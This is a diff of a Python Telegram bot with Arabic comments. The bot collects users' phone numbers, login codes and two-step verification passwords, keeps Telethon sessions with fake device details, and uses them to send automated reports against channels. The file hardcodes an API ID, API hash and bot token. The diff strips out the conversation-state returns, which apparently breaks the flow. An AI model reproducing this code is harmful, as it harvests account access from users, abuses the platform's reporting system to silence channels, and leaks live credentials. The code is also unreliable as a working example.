@@ -10,6 +10,7 @@ import os
 API_ID = '16748685'
 API_HASH = 'f0c8f7e4a7a50b5c64fd5243a256fd2f'
 BOT_TOKEN = '7852676274:AAHIx3Q9qFbylmvHKDhbhT5nEpFOFA5i2CM'
+
 # إنشاء كائن Faker
 fake = Faker()
 
@@ -30,14 +31,20 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     if query.data == 'register':
         await query.edit_message_text(text="الرجاء إدخال رقم هاتفك مع رمز الدولة (مثال: +1234567890):")
-        return 'PHONE'
+        return
     elif query.data == 'report':
         await query.edit_message_text(text="الرجاء إدخال اسم المستخدم أو رابط القناة/المجموعة التي تريد الإبلاغ عنها:")
-        return 'CHANNEL'
+        return
 
 async def phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     phone = update.message.text
+
+    # تحقق من صحة رقم الهاتف
+    if not phone.startswith('+') or not phone[1:].isdigit():
+        await update.message.reply_text("الرجاء إدخال رقم هاتف صالح مع رمز الدولة (مثال: +1234567890).")
+        return
+    
     user_data[user_id] = {'phone': phone}
     
     # معلومات الجهاز الوهمية
@@ -60,7 +67,6 @@ async def phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
             sent_code = await client.send_code_request(phone)
             user_data[user_id]['phone_code_hash'] = sent_code.phone_code_hash
             await update.message.reply_text("تم إرسال رمز التحقق. الرجاء إدخاله:")
-            return 'CODE'
         except Exception as e:
             await update.message.reply_text(f"حدث خطأ: {str(e)}")
             return
@@ -78,7 +84,6 @@ async def verification_code(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     except Exception as e:
         if 'TWO_STEPS_VERIFICATION_REQUIRED' in str(e):
             await update.message.reply_text("مطلوب التحقق بخطوتين. الرجاء إدخال كلمة المرور:")
-            return 'PASSWORD'
         else:
             await update.message.reply_text(f"حدث خطأ: {str(e)}")
 
@@ -141,7 +146,6 @@ async def report_channel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         await query.edit_message_text("لم يتم العثور على معلومات القناة. حاول مرة أخرى.")
         return
 
-    # إنشاء جلسة العميل من جديد إذا لزم الأمر
     client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
     await client.connect()
 
@@ -161,14 +165,12 @@ async def report_channel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         return
 
     try:
-        # تنفيذ طلب الإبلاغ عن القناة
         result = await client(ReportPeerRequest(
             peer=InputPeerChannel(channel.id, channel.access_hash),
             reason=reason,
             message="تقرير تلقائي من البوت"
         ))
 
-        # التحقق من نجاح الإبلاغ
         if result:
             await query.edit_message_text("تم الإبلاغ بنجاح!")
         else:
